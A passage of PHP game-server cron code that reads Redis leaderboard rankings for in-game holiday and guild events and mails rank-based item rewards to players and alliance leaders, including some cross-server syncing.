                    $mailModel = new MailModel($uid);
                    $tip = CRONTAB_281_4.'|'.$club_rid.'|'.CRONTAB_281_5;
                    if($mem['post'] == 1){ //盟主奖励
                        $mailModel->sendMail($uid,CRONTAB_281_6,$tip,1,$rwd['mengzhu']);
                    }else{ //非盟主奖励
                        $mailModel->sendMail($uid,CRONTAB_281_6,$tip,1,$rwd['member']);
                    }
                    $mailModel->destroy();
                    echo '联盟: '.$cid.' 玩家id: '.$uid."--已发\n";
                    break;
                }
            }
             
        }
    }
}


/*
 * 发放活动奖励  ---   惩戒来福奖励
 */
function huodong_282_rwd($SevidCfg,$hd_info){
    $key = 'huodong_282_my_'.$hd_info['info']['id'].'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($hd_info['rwd']['my'] as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                $tip = CRONTAB_282_1.'|'.$rid.'|'.CRONTAB_282_2;

                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,CRONTAB_282_3,$tip,1,$rwd['member']);
                $mailModel->destroy();

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }
    }

    $club_key = 'huodong_282_club_'.$hd_info['info']['id'].'_redis';
    $club_rdata  = $redis->zRevRange($club_key, 0, -1,true);  //获取排行数据
    if(empty($club_rdata)){
        echo $club_key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $club_rid = 0; //排名
    foreach($club_rdata as $cid => $score){
        $club_rid ++;
        $ClubModel = Master::getClub($cid);
        foreach($ClubModel->info['members'] as $uid => $mem){
            foreach($hd_info['rwd']['club'] as $rwd){
                //如果在排名奖励范围内  发放奖励
                if($club_rid >= $rwd['rand']['rs'] && $club_rid <= $rwd['rand']['re']){
                    $mailModel = new MailModel($uid);
                    $tip = CRONTAB_282_4.'|'.$club_rid.'|'.CRONTAB_282_5;
                    if($mem['post'] == 1){ //盟主奖励
                        $mailModel->sendMail($uid,CRONTAB_282_6,$tip,1,$rwd['mengzhu']);
                    }else{ //非盟主奖励
                        $mailModel->sendMail($uid,CRONTAB_282_6,$tip,1,$rwd['member']);
                    }
                    $mailModel->destroy();
                    echo '联盟: '.$cid.' 玩家id: '.$uid."--已发\n";
                    break;
                }
            }
            	
        }
    }
}


/*
 * 发放活动奖励  ---   国庆狂欢奖励
 */
function huodong_283_rwd($SevidCfg,$hd_info){
    $key = 'huodong_283_my_'.$hd_info['info']['id'].'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($hd_info['rwd']['my'] as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                $tip = CRONTAB_283_1.'|'.$rid.'|'.CRONTAB_283_2;

                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,CRONTAB_283_3,$tip,1,$rwd['member']);
                $mailModel->destroy();

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }
    }

    $club_key = 'huodong_283_club_'.$hd_info['info']['id'].'_redis';
    $club_rdata  = $redis->zRevRange($club_key, 0, -1,true);  //获取排行数据
    if(empty($club_rdata)){
        echo $club_key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $club_rid = 0; //排名
    foreach($club_rdata as $cid => $score){
        $club_rid ++;
        $ClubModel = Master::getClub($cid);
        foreach($ClubModel->info['members'] as $uid => $mem){
            foreach($hd_info['rwd']['club'] as $rwd){
                //如果在排名奖励范围内  发放奖励
                if($club_rid >= $rwd['rand']['rs'] && $club_rid <= $rwd['rand']['re']){
                    $mailModel = new MailModel($uid);
                    $tip = CRONTAB_283_4.'|'.$club_rid.'|'.CRONTAB_283_5;
                    if($mem['post'] == 1){ //盟主奖励
                        $mailModel->sendMail($uid,CRONTAB_283_6,$tip,1,$rwd['mengzhu']);
                    }else{ //非盟主奖励
                        $mailModel->sendMail($uid,CRONTAB_283_6,$tip,1,$rwd['member']);
                    }
                    $mailModel->destroy();
                    echo '联盟: '.$cid.' 玩家id: '.$uid."--已发\n";
                    break;
                }
            }
             
        }
    }
}

/*
 * 发放活动奖励  ---   国庆狂欢奖励
 */
function huodong_284_rwd($SevidCfg,$hd_info){
	$key = 'huodong_284_my_'.$hd_info['info']['id'].'_redis';
	$redis = Common::getDftRedis();
	$rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
	if(empty($rdata)){
		echo $key.CRONTAB_NO_RANK."\n";
		return false;
	}
	$rid = 0; //排名
	foreach($rdata as $uid => $score){
		$rid ++;
		foreach($hd_info['rwd']['my'] as $rwd){
			//如果在排名奖励范围内  发放奖励
			if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
				$tip = CRONTAB_284_1.'|'.$rid.'|'.CRONTAB_284_2;

				$mailModel = new MailModel($uid);
				$mailModel->sendMail($uid,CRONTAB_284_3,$tip,1,$rwd['member']);
				$mailModel->destroy();

				echo ' 玩家id: '.$uid."--已发\n";
				break;
			}
		}
	}

	$club_key = 'huodong_284_club_'.$hd_info['info']['id'].'_redis';
	$club_rdata  = $redis->zRevRange($club_key, 0, -1,true);  //获取排行数据
	if(empty($club_rdata)){
		echo $club_key.CRONTAB_NO_RANK."\n";
		return false;
	}
	$club_rid = 0; //排名
	foreach($club_rdata as $cid => $score){
		$club_rid ++;
		$ClubModel = Master::getClub($cid);
		foreach($ClubModel->info['members'] as $uid => $mem){
			foreach($hd_info['rwd']['club'] as $rwd){
				//如果在排名奖励范围内  发放奖励
				if($club_rid >= $rwd['rand']['rs'] && $club_rid <= $rwd['rand']['re']){
					$mailModel = new MailModel($uid);
					$tip = CRONTAB_284_4.'|'.$club_rid.'|'.CRONTAB_284_5;
					if($mem['post'] == 1){ //盟主奖励
						$mailModel->sendMail($uid,CRONTAB_284_6,$tip,1,$rwd['mengzhu']);
					}else{ //非盟主奖励
						$mailModel->sendMail($uid,CRONTAB_284_6,$tip,1,$rwd['member']);
					}
					$mailModel->destroy();
					echo '联盟: '.$cid.' 玩家id: '.$uid."--已发\n";
					break;
				}
			}

		}
	}
}

/*
 * 发放活动奖励  ---   招财奖励
 */
function huodong_294_rwd($SevidCfg,$hd_info){
    $key = 'huodong_294_my_'.$hd_info['info']['id'].'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($hd_info['rank']['my'] as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                $tip = CRONTAB_294_1.'|'.$rid.'|'.CRONTAB_294_2;

                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,CRONTAB_294_3,$tip,1,$rwd['member']);
                $mailModel->destroy();

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }
    }

    $club_key = 'huodong_294_club_'.$hd_info['info']['id'].'_redis';
    $club_rdata  = $redis->zRevRange($club_key, 0, -1,true);  //获取排行数据
    if(empty($club_rdata)){
        echo $club_key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $club_rid = 0; //排名
    foreach($club_rdata as $cid => $score){
        $club_rid ++;
        $ClubModel = Master::getClub($cid);
        foreach($ClubModel->info['members'] as $uid => $mem){
            foreach($hd_info['rank']['club'] as $rwd){
                //如果在排名奖励范围内  发放奖励
                if($club_rid >= $rwd['rand']['rs'] && $club_rid <= $rwd['rand']['re']){
                    $mailModel = new MailModel($uid);
                    $tip = CRONTAB_294_4.'|'.$club_rid.'|'.CRONTAB_294_5;
                    if($mem['post'] == 1){ //盟主奖励
                        $mailModel->sendMail($uid,CRONTAB_294_6,$tip,1,$rwd['mengzhu']);
                    }else{ //非盟主奖励
                        $mailModel->sendMail($uid,CRONTAB_294_6,$tip,1,$rwd['member']);
                    }
                    $mailModel->destroy();
                    echo '联盟: '.$cid.' 玩家id: '.$uid."--已发\n";
                    break;
                }
            }

        }
    }
}

/*
 * 跨服衙门活动
 */
function huodong_300_rwd($SevidCfg,$hd_info){
    $key = 'huodong_300_score_'.$hd_info['info']['id'].'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($hd_info['rwd']['my'] as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                $tip = KUAYAMEN_MY_MAIL_REWARD_CONTENT_HEADER.'|'.$rid.'|'.KUAYAMEN_MY_MAIL_REWARD_CONTENT_FOOT;

				$LockModel = new MyLockModel("user_".$uid, Game::get_sevid($uid));
				$uid_Lock = $LockModel->getLock(3);

                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,KUAYAMEN_MY_MAIL_REWARD_TITLE,$tip,1,$rwd['member']);
				$mailModel->destroy();

				if (!$uid_Lock) {
					$LockModel->releaseLock();
				}

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }
    }
}

/*
 * 发放活动奖励  ---   联盟势力涨幅奖励
 */
function huodong_310_rwd($SevidCfg,$hd_info){

    $key = 'huodong_310_'.$hd_info['info']['id'].'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }

    $rid = 0; //排名
    foreach($rdata as $cid => $score){
        $rid ++;
        $newRid = $rid;
        if(!empty($hd_info['fuli'][$SevidCfg['he']][$newRid])){
            $newRid = $hd_info['fuli'][$SevidCfg['he']][$newRid];

            $oldScore = $redis->zRevRange( $key, $newRid-1, $newRid-1,true);
            $redis->zAdd($key, intval(current($oldScore)), $cid );
        }

        $ClubModel = Master::getClub($cid);
        foreach($ClubModel->info['members'] as $uid => $mem){
            foreach($hd_info['rwd'] as $rwd){
                //如果在排名奖励范围内  发放奖励
                if($newRid >= $rwd['rand']['rs'] && $newRid <= $rwd['rand']['re']){
                    $mailModel = new MailModel($uid);
                    $tip = MAIL_CLUBSL_LIST_CONTENT_HEAD.'|'.$newRid.'|'.MAIL_CLUBSL_LIST_CONTENT_FOOT;
                    if($mem['post'] == 1){ //盟主奖励
                        $mailModel->sendMail($uid,MAIL_CLUBSL_LIST,$tip,1,$rwd['mengzhu']);
                    }else{ //非盟主奖励
                        $mailModel->sendMail($uid,MAIL_CLUBSL_LIST,$tip,1,$rwd['member']);
                    }
                    $mailModel->destroy();
                    echo '联盟: '.$cid.' 玩家id: '.$uid."--已发\n";
                    break;
                }
            }

        }
    }
}

/*
 * 发放活动奖励  ---   腊八节奖励
 */
function huodong_286_rwd($SevidCfg,$hd_info){
	$key = 'huodong_286_my_'.$hd_info['info']['id'].'_redis';
	$redis = Common::getDftRedis();
	$rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
	if(empty($rdata)){
		echo $key.CRONTAB_NO_RANK."\n";
		return false;
	}
	$rid = 0; //排名
	foreach($rdata as $uid => $score){
		$rid ++;
		foreach($hd_info['rwd']['my'] as $rwd){
			//如果在排名奖励范围内  发放奖励
			if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
				$tip = MAIL_HD286_MY_LIST_CONTENT_HEAD.'|'.$rid.'|'.MAIL_HD286_MY_LIST_CONTENT_FOOT;

				$mailModel = new MailModel($uid);
				$mailModel->sendMail($uid,MAIL_HD286_MY_LIST,$tip,1,$rwd['member']);
				$mailModel->destroy();

				echo ' 玩家id: '.$uid."--已发\n";
				break;
			}
		}
	}

	$club_key = 'huodong_286_club_'.$hd_info['info']['id'].'_redis';
	$club_rdata  = $redis->zRevRange($club_key, 0, -1,true);  //获取排行数据
	if(empty($club_rdata)){
		echo $club_key.CRONTAB_NO_RANK."\n";
		return false;
	}
	$club_rid = 0; //排名
	foreach($club_rdata as $cid => $score){
		$club_rid ++;
		$ClubModel = Master::getClub($cid);
		foreach($ClubModel->info['members'] as $uid => $mem){
			foreach($hd_info['rwd']['club'] as $rwd){
				//如果在排名奖励范围内  发放奖励
				if($club_rid >= $rwd['rand']['rs'] && $club_rid <= $rwd['rand']['re']){
					$mailModel = new MailModel($uid);
					$tip = MAIL_HD286_CLUB_LIST_CONTENT_HEAD.'|'.$club_rid.'|'.MAIL_HD286_MY_LIST_CONTENT_FOOT;
					if($mem['post'] == 1){ //盟主奖励
						$mailModel->sendMail($uid,MAIL_HD286_CLUB_LIST,$tip,1,$rwd['mengzhu']);
					}else{ //非盟主奖励
						$mailModel->sendMail($uid,MAIL_HD286_CLUB_LIST,$tip,1,$rwd['member']);
					}
					$mailModel->destroy();
					echo '联盟: '.$cid.' 玩家id: '.$uid."--已发\n";
					break;
				}
			}

		}
	}
}

/*
 * 发放活动奖励  ---   子嗣势力冲榜奖励
 */
function huodong_311_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 311, $hd_info['rwd'], 'SONSL');
}

/*
 * 发放活动奖励  ---   宫殿宫斗冲榜奖励
 */
function huodong_315_rwd($SevidCfg, $hd_info)
{
    $key = 'huodong_315_' . $hd_info['info']['id'] . '_redis';
    $redis = Common::getDftRedis();
    $rdata = $redis->zRevRange($key, 0, -1, true);  //获取排行数据
    if (empty($rdata)) {
        echo $key . CRONTAB_NO_RANK . "\n";
        return false;
    }
    $rid = 0; //排名
    foreach ($rdata as $cid => $score) {//排行列表 遍历   一个循环一个联盟
        $rid++;
        $ClubModel = Master::getClub($cid);//帮会信息
        $members = $ClubModel->info['members'];
        foreach ($hd_info['rwd'] as $rwd) {//遍历奖励 放外层  名次与联盟挂钩  一个循环一个奖励档次
            //如果在排名奖励范围内  发放奖励
            if ($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']) {
                foreach ($members as $uid => $mem) {//最后在遍历成员发奖励   一个循环一个成员
                    if ($rid == 1 && $mem['post'] == 1) {//第一名盟主额外奖励
                        $items = $rwd['mengzhu'];
                    } else {//成员
                        $items = $rwd['member'];
                    }
                    $tip = MAIL_GONG_DIAN_GONG_LIST_CONTENT_1.'|'. $rid .'|'. MAIL_GONG_DIAN_GONG_LIST_CONTENT_2;
                    $mailModel = new MailModel($uid);
                    $mailModel->sendMail($uid, MAIL_GONG_DIAN_GONG_DOU_LIST, $tip, 1, $items);
                    $mailModel->destroy();
                    echo ' 玩家id: ' . $uid . "--已发\n";
                }
            }
        }

    }
}

/*
 * 发放活动奖励  --- 新年活动
 */
function huodong_298_year_rwd($SevidCfg,$hd_info){
	$key = 'huodong_298_day_'.$hd_info['info']['id'].'_'.Game::get_today_long_id(-1).'_redis';
	$redis = Common::getDftRedis();
	$rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
	if(empty($rdata)){
		echo $key.CRONTAB_NO_RANK."\n";
		return false;
	}
	$rid = 0; //排名
	foreach($rdata as $uid => $score){
		$rid ++;
		foreach($hd_info['rwd']['everyday'] as $rwd){
			//如果在排名奖励范围内  发放奖励
			if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
				$tip = MAIL_NEWYEAR_LIST_EVERYDAY_CONTENT_HEAD.'|'.$rid.'|'.MAIL_NEWYEAR_LIST_EVERYDAY_CONTENT_FOOT;

				$mailModel = new MailModel($uid);
				$mailModel->sendMail($uid,MAIL_NEWYEAR_LIST,$tip,1,$rwd['member']);
				$mailModel->destroy();

				echo ' 玩家id: '.$uid."--已发\n";
				break;
			}
		}

	}
}


/*
 * 发放活动奖励  --- 新年活动
 */
function huodong_298_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], '311_total', $hd_info['rwd']['total'], 'NEWYEAR');
}

/*
 * 发放活动奖励  --- 国力庆典
 */
function huodong_6187_everyday_type_rwd($SevidCfg,$hd_info,$hd_k,$type){
    $key = $hd_k.'_'.$hd_info['info']['id'].'_'.Game::get_today_long_id(-1).'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($hd_info['rwd'] as $rwd){
            //如果在排名奖励范围内  发放奖励
            $title = 'MAIL_GUOLIQINGDIAN_'.$type.'_LIST';
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                if(!empty($rwd['added']) && $rwd['rand']['rs'] < 4 && $score >= $rwd['need']){

                    $rwd['member'] = array_merge($rwd['member'],$rwd['added']);
                }
                $tip = MAIL_GUOLIQINGDIAN_LIST_EVERYDAY_.$type._CONTENT_HEAD.'|'.$rid.'|'.MAIL_GUOLIQINGDIAN_LIST_EVERYDAY_.$type._CONTENT_FOOT;
                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,$title,$tip,1,$rwd['member']);
                $mailModel->destroy();

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }

    }
}

/*
 * 发放活动奖励  --- 国力庆典
 */
function huodong_6187_rwd($SevidCfg,$hd_info){
    $key = 'huodong_6187_'.$hd_info['info']['id'].'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($hd_info['total'] as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                if(!empty($rwd['added']) && $rwd['rand']['rs'] < 4 && $score >= $rwd['need']){

                    $rwd['member'] = array_merge($rwd['member'],$rwd['added']);
                }
                $tip = 'MAIL_GUOLIQINGDIAN_LIST_CONTENT_HEAD|'.$rid.'|MAIL_GUOLIQINGDIAN_LIST_CONTENT_FOOT';
                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,'MAIL_GUOLIQINGDIAN_LIST',$tip,1,$rwd['member']);
                $mailModel->destroy();

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }
    }
}

/*
 * 发放活动奖励  --- 幸运转盘
 */
function huodong_6227_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6227, $hd_info['rwd']['total'], 'XINGYUNZHUANPAN');
}

/*
 * 发放活动奖励  --- 幸运转盘每日
 */
function huodong_6227_year_rwd($SevidCfg,$hd_info){
    $key = 'huodong_6227_'.$hd_info['info']['id'].'_'.Game::get_today_long_id(-1).'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($hd_info['rwd']['everyday'] as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                $tip = MAIL_XINGYUNZHUANPAN_LIST_EVERYDAY_CONTENT_HEAD.'|'.$rid.'|'.MAIL_XINGYUNZHUANPAN_LIST_EVERYDAY_CONTENT_FOOT;

                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,MAIL_XINGYUNZHUANPAN_LIST,$tip,1,$rwd['member']);
                $mailModel->destroy();

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }

    }
}

/*
 * 发放活动奖励  --- 劳动节
 */
function huodong_6229_rwd($SevidCfg,$hd_info){
    huodong_6229_rwd_SendMail($SevidCfg, $hd_info['info']['id'], 6229, $hd_info['rwd'],$hd_info['finalrwd'], 'LABORDAY');
}

function huodong_6229_rwd_SendMail($SevidCfg, $id, $k, $rwds, $winrwds, $kName){
    $key = 'huodong_'.$k.'_'.$id.'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    $Sev6229Model = Master::getSev6229($id);
    $Sev6229Model->setWinID();
    $winid = $Sev6229Model->info['index'];
    if ($winid == 1){
        $wkey = 'huodong_6229_1'.'_'.$id.'_redis';
        $lkey = 'huodong_6229_2'.'_'.$id.'_redis';
    }else{
        $wkey = 'huodong_6229_2'.'_'.$id.'_redis';
        $lkey = 'huodong_6229_1'.'_'.$id.'_redis';
    }
    $redis = Common::getDftRedis();
    $wdata  = $redis->zRevRange($wkey, 0, -1,true);  //获取排行数据
    if (!empty($wdata)){
        foreach($wdata as $uid => $score){
            $tip = 'MAIL_'.$kName.'_LIST_CONTENT_HEAD_MAIL_'.$kName.'_WIN_LIST_CONTENT_FOOT';
            $mailModel = new MailModel($uid);
            $mailModel->sendMail($uid,'MAIL_'.$kName.'_WIN_LIST',$tip,1,$winrwds['win']);
            $mailModel->destroy();
            echo ' WIN_玩家id: '.$uid."--已发\n";
        }
    }
    $redis = Common::getDftRedis();
    $ldata  = $redis->zRevRange($lkey, 0, -1,true);  //获取排行数据
    if (!empty($ldata)){
        foreach($ldata as $uid => $score){
            $tip = 'MAIL_'.$kName.'_LIST_CONTENT_HEAD_MAIL_'.$kName.'_LOST_LIST_CONTENT_FOOT';
            $mailModel = new MailModel($uid);
            $mailModel->sendMail($uid,'MAIL_'.$kName.'_LOST_LIST',$tip,1,$winrwds['lost']);
            $mailModel->destroy();
            echo ' LOST_玩家id: '.$uid."--已发\n";
        }
    }
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK2."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($rwds as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                $tip = 'MAIL_'.$kName.'_LIST_CONTENT_HEAD|'.$rid.'|MAIL_'.$kName.'_LIST_CONTENT_FOOT';

                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,'MAIL_'.$kName.'_LIST',$tip,1,$rwd['member']);
                $mailModel->destroy();

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }
    }
}

/*
 * 发放活动奖励  ---   劳动节
 */
function huodong_6230_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6230, $hd_info['rwd'], 'DRAGONBOAT');
}

/*
 * 发放活动奖励  ---   抢糕点
 */
function huodong_6231_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6231, $hd_info['rwd'], 'GAODIAN');
}

/*
 * 发放活动奖励 --- 热气球
 */
function huodong_6232_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6232, $hd_info['rwd'], 'REQIQIU');
}

/*
 * 发放活动奖励 --- 热气球
 */
function huodong_8002_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 8002, $hd_info['rwd'], 'HUANGZHILILIAN');
}

/*
 * 发放活动奖励 --- 许愿池
 */
function huodong_8003_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 8003, $hd_info['rankRwd'], 'XUYUANCHI');
}

/*
 * 发放活动奖励 --- 堆雪人
 */
function huodong_6183_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6183, $hd_info['rankRwd'], 'DUIXUEREN');
}

/*
 * 发放活动奖励 --- 圣诞节
 */
function huodong_8005_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 8005, $hd_info['rankRwd'], 'SHENGDANJIE');
}

/***
 * 抢荷灯活动
 */
function huodong_6234_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6234, $hd_info['rwd'], 'HEDANRI');
}

/***
 * 抢荷灯活动
 */
function huodong_6241_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6241, $hd_info['rankRwd'], 'SEVENDAYS');
}

/**
 * 跨服奖励发放
 * @param array  $SevidCfg  活动key
 * @param string  $id       活动id
 * @param string  $k        活动编号
 * @param string  $rwds     活动奖励
 * @param string  $serv     跨服区服信息
 * @param string  $redisBak 跨服排行结果备份
 * @param string  $kName    邮件文字信息标识
 */
function huodongRwdSendMailKua($SevidCfg, $id, $k, $rwds, $serv,$redisBak,$kName){

    $kua_info = Game::kua_zhufu($serv);

    if(empty($kua_info['zhufu']) || $kua_info['zhufu'] != $SevidCfg['he'] ){
        echo "主服是:".$kua_info['zhufu']."__我不是主服\n";
        return false;
    }

    $key = 'huodong_'.$k.'_user_'.$id.'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }

    $skey = 'huodong_'.$k.'_serv_'.$id.'_redis';
    $sdata  = $redis->zRevRange($skey, 0, -1,true);  //获取排行数据
    $section = array_keys($sdata);//获取跨服区间

    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($rwds as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                if ($rid == 1){
                    foreach ($rwd['member'] as $ik => $it){
                        if($it['kind'] != 10){
                            continue;
                        }
                        foreach ($section as $sid){
                            $he_id = Common::getSevCfgObj($sid)->getHE();
                            $Sev5Model = Master::getSev5(1,1,$he_id);
                            $Sev5Model->add_wangye($uid,$it['id']);
                        }
                    }
                }
                $LockModel = new MyLockModel("user_".$uid, Game::get_sevid($uid));
                $uid_Lock = $LockModel->getLock(3);

                $tip = $kName.'_HD_ZS_CONTENT_HEAD|'.$rid.'|'.$kName.'_HD_ZS_CONTENT_FOOT';
                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,$kName.'_HD_ZS_LIST',$tip,1,$rwd['member']);
                $mailModel->destroy();

                if (!$uid_Lock) {
                    $LockModel->releaseLock();
                }

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }

    }

    echo ' 主服id: '.$kua_info['zhufu']."进入区服同步\n";

    foreach($sdata as $servk => $score){
        $RedisName = 'getRedis'.$redisBak;
        $RedisModel = Master::$RedisName();
        $RedisModel->zAdd($servk,$score);
        echo ' 区服: '.$servk.' 分数: '.$score."--已同步\n";
    }

}

/*
 * 跨服势力冲榜
 */
function huodong_313_rwd($SevidCfg,$hd_info){
    huodongRwdSendMailKua($SevidCfg, $hd_info['info']['id'], 313, $hd_info['rwd'], $hd_info['need']['serv'],133,'FORCES');
}

/*
 * 跨服好感冲榜
 */
function huodong_314_rwd($SevidCfg,$hd_info){
    huodongRwdSendMailKua($SevidCfg, $hd_info['info']['id'], 314, $hd_info['rwd'], $hd_info['need']['serv'],139,'CLOSE');
}

/**
 * 跨服预选赛发奖
 * @param array  $SevidCfg  活动key
 * @param string  $id       活动id
 * @param string  $k        活动编号
 * @param array  $rwds     活动奖励
 * @param string  $redisBak 跨服排行结果备份
 * @param string  $kName    邮件文字信息标识
 */
function huodongRwdSendMailYu($SevidCfg,$id,$k,$act,$rwds,$redisPK,$kName){

    $key = 'huodong_'.$k.'_'.$id.'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;

        //跨服势力冲榜资格
        $modeName= 'getAct'.$act;
        $ActModel = Master::$modeName($uid);
        $is_true = $ActModel->add_quan($rid,$score);
        $ActModel->ht_destroy();
        if($is_true){
            //下发邮件通知--入选资格
            $mailModel = new MailModel($uid);
            $mailModel->sendMail($uid,$kName.'_HD_YX_TITLE',$kName.'_HD_YX_CONTENT',0,0);
            $mailModel->destroy();
        }

        foreach($rwds as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                $tip = 'MAIL_'.$kName.'_LIST_CONTENT_HEAD|'.$rid.'|MAIL_'.$kName.'_LIST_CONTENT_FOOT';

                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,'MAIL_'.$kName.'_LIST',$tip,1,$rwd['member']);
                $mailModel->destroy();

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }

    }

    //列入pk战队
    echo ' 区服id: '.$SevidCfg['he']."--加入匹配战列\n";
    $RedisName = 'getRedis'.$redisPK;
    $RedisModel = Master::$RedisName($SevidCfg['he']);
    $RedisModel->comein_pk($SevidCfg['he']);
}

/*
 * 发放活动奖励  ---   势力冲榜奖励
 */
function huodong_252_rwd($SevidCfg,$hd_info){
    huodongRwdSendMailYu($SevidCfg, $hd_info['info']['id'],252,313, $hd_info['rwd'], 134,'FORCES');
}

/*
 * 发放活动奖励  ---   势力冲榜奖励
 */
